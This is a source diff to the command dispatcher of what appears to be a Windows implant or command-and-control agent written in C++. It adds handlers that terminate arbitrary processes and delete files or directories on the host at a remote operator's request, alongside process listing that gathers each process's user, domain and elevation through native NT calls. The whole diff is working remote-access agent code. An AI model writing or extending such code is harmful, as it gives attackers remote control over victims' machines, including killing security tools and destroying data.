@@ -44,9 +44,15 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		case COMMAND_PS_LIST:
 			this->CmdPsList(CommandId, inPacker, outPacker); break;
 
+		case COMMAND_PS_KILL:
+			this->CmdPsKill(CommandId, inPacker, outPacker); break;
+
 		case COMMAND_PWD:       
 			this->CmdPwd(CommandId, inPacker, outPacker); break;
-		
+
+		case COMMAND_RM:
+			this->CmdRm(CommandId, inPacker, outPacker); break;
+
 		case COMMAND_TERMINATE: 
 			this->CmdTerminate(CommandId, inPacker, outPacker); break;
 		
@@ -291,31 +297,6 @@ void Commander::CmdProfile(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	}
 }
 
-void Commander::CmdPwd(ULONG commandId, Packer* inPacker, Packer* outPacker)
-{
-	CHAR  path[MAX_PATH] = { 0 };
-	ULONG pathSize = ApiWin->GetCurrentDirectoryA(MAX_PATH, path);
-	ULONG taskId   = inPacker->Unpack32();
-
-	outPacker->Pack32(taskId);
-
-	if (pathSize) {
-		outPacker->Pack32(commandId);
-		outPacker->PackBytes((PBYTE)path, pathSize);
-	}
-	else {
-		outPacker->Pack32(COMMAND_ERROR);
-		outPacker->Pack32(TEB->LastErrorValue);
-	}
-}
-
-void Commander::CmdTerminate(ULONG commandId, Packer* inPacker, Packer* outPacker)
-{
-	agent->config->exit_method  = inPacker->Unpack32();
-	agent->config->exit_task_id = inPacker->Unpack32();
-	agent->SetActive(false);
-}
-
 void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG taskId = inPacker->Unpack32();
@@ -327,9 +308,9 @@ void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
 
 	ULONG spiSize = 0;
 	NTSTATUS NtStatus = ApiNt->NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &spiSize);
-	if ( !NT_SUCCESS(NtStatus) ) {
+	if (!NT_SUCCESS(NtStatus)) {
 		spiSize += 0x1000;
-		spi = (PSYSTEM_PROCESS_INFORMATION) MemAllocLocal(spiSize);
+		spi = (PSYSTEM_PROCESS_INFORMATION)MemAllocLocal(spiSize);
 		if (spi)
 			NtStatus = ApiNt->NtQuerySystemInformation(SystemProcessInformation, spi, spiSize, &spiSize);
 	}
@@ -342,29 +323,29 @@ void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack32(0);
 
 		DWORD accessMask = 0;
-		if ( agent->info->major_version == 5 && agent->info->minor_version == 1 )
+		if (agent->info->major_version == 5 && agent->info->minor_version == 1)
 			accessMask = PROCESS_QUERY_INFORMATION;
 		else
 			accessMask = PROCESS_QUERY_LIMITED_INFORMATION;
 
 		do {
 			BOOL  elevated = FALSE;
-			BYTE  arch64   = 10;
+			BYTE  arch64 = 10;
 			CHAR  processName[260] = { 0 };
 			ULONG usernameSize = MAX_PATH;
 			CHAR  username[MAX_PATH] = { 0 };
 			ULONG domainSize = MAX_PATH;
-			CHAR  domain[MAX_PATH]   = { 0 };
+			CHAR  domain[MAX_PATH] = { 0 };
 
 			OBJECT_ATTRIBUTES ObjectAttr = { sizeof(OBJECT_ATTRIBUTES) };
 			InitializeObjectAttributes(&ObjectAttr, NULL, 0, NULL, NULL);
 
-			BOOL      result   = FALSE;
-			HANDLE    hToken   = NULL;
+			BOOL      result = FALSE;
+			HANDLE    hToken = NULL;
 			HANDLE    hProcess = NULL;
 			CLIENT_ID clientId = { spi->UniqueProcessId, 0 };
 			NtStatus = ApiNt->NtOpenProcess(&hProcess, accessMask, &ObjectAttr, &clientId);
-			if ( NT_SUCCESS(NtStatus) ) {
+			if (NT_SUCCESS(NtStatus)) {
 
 				ULONG_PTR piWow64 = NULL;
 				NtStatus = ApiNt->NtQueryInformationProcess(hProcess, ProcessWow64Information, &piWow64, sizeof(ULONG_PTR), NULL);
@@ -372,10 +353,10 @@ void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
 					arch64 = (piWow64 == 0);
 
 				NtStatus = ApiNt->NtOpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
-				if( NT_SUCCESS(NtStatus) ) {
+				if (NT_SUCCESS(NtStatus)) {
 
 					if (hToken) {
-						LPVOID tokenInfo     = NULL;
+						LPVOID tokenInfo = NULL;
 						DWORD  tokenInfoSize = 0;
 						result = ApiWin->GetTokenInformation(hToken, TokenUser, tokenInfo, 0, &tokenInfoSize);
 						if (!result) {
@@ -428,10 +409,10 @@ void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
 				hToken = NULL;
 			}
 
-			if ( !spi->NextEntryOffset ) 
+			if (!spi->NextEntryOffset)
 				break;
 			spi = (SYSTEM_PROCESS_INFORMATION*)((BYTE*)spi + spi->NextEntryOffset);
-		} while ( TRUE );
+		} while (TRUE);
 
 		if (spiAddr)
 			MemFreeLocal((LPVOID*)&spiAddr, spiSize);
@@ -442,6 +423,90 @@ void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack8(TRUE);
 		outPacker->Pack32(87);
 	}
+}
+
+void Commander::CmdPsKill(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG64 pid = inPacker->Unpack32();
+	ULONG taskId = inPacker->Unpack32();
+
+	outPacker->Pack32(taskId);
+	
+	OBJECT_ATTRIBUTES ObjectAttr = { sizeof(OBJECT_ATTRIBUTES) };
+	InitializeObjectAttributes(&ObjectAttr, NULL, 0, NULL, NULL);
+
+	CLIENT_ID clientID = { (HANDLE)pid, 0 };
+	HANDLE    hProcess = NULL;
+
+	NTSTATUS status = ApiNt->NtOpenProcess(&hProcess, PROCESS_TERMINATE, &ObjectAttr, &clientID);
+	if ( NT_SUCCESS(status) ) {
+		outPacker->Pack32(commandId);
+		ApiNt->NtTerminateProcess(hProcess, 0);
+		outPacker->Pack32(pid);
+	}
+	else {
+		ULONG error = ApiNt->RtlNtStatusToDosError(status);
+		outPacker->Pack32(COMMAND_ERROR);
+		outPacker->Pack32(error);
+	}
+
+	if (hProcess) {
+		ApiNt->NtClose(hProcess);
+		hProcess = NULL;
+	}
+}
+
+void Commander::CmdPwd(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	CHAR  path[MAX_PATH] = { 0 };
+	ULONG pathSize = ApiWin->GetCurrentDirectoryA(MAX_PATH, path);
+	ULONG taskId   = inPacker->Unpack32();
+
+	outPacker->Pack32(taskId);
+
+	if (pathSize) {
+		outPacker->Pack32(commandId);
+		outPacker->PackBytes((PBYTE)path, pathSize);
+	}
+	else {
+		outPacker->Pack32(COMMAND_ERROR);
+		outPacker->Pack32(TEB->LastErrorValue);
+	}
+}
+
+void Commander::CmdRm(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG pathSize = 0;
+	CHAR* path = (CHAR*)inPacker->UnpackBytes(&pathSize);
+	ULONG taskId = inPacker->Unpack32();
+
+	outPacker->Pack32(taskId);
+
+	DWORD dwAttrib = ApiWin->GetFileAttributesA(path);
+
+	bool result = FALSE;
+	bool directory = (dwAttrib != INVALID_FILE_ATTRIBUTES && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
+
+	if ( directory )
+		result = ApiWin->RemoveDirectoryA(path);
+	else
+		result = ApiWin->DeleteFileA(path);
+
+	if (result) {
+		outPacker->Pack32(commandId);
+		outPacker->Pack8(directory);
+	}
+	else {
+		outPacker->Pack32(COMMAND_ERROR);
+		outPacker->Pack32(TEB->LastErrorValue);
+	}
+}
+
+void Commander::CmdTerminate(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	agent->config->exit_method  = inPacker->Unpack32();
+	agent->config->exit_task_id = inPacker->Unpack32();
+	agent->SetActive(false);
 }
 
 void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
